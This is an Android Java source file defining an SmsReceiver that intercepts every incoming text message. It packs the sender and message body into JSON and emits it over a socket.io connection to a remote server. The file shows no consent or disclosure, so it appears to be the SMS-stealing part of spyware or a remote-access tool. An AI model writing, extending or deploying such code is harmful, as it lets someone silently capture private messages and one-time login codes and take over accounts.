package com.example.expoproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import io.socket.client.Socket;
import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private Socket socket;

    public SmsReceiver(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();
                // Send to server
                JSONObject data = new JSONObject();
                try {
                    data.put("type", "sms");
                    data.put("sender", sender);
                    data.put("body", messageBody);
                    socket.emit("data", data);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}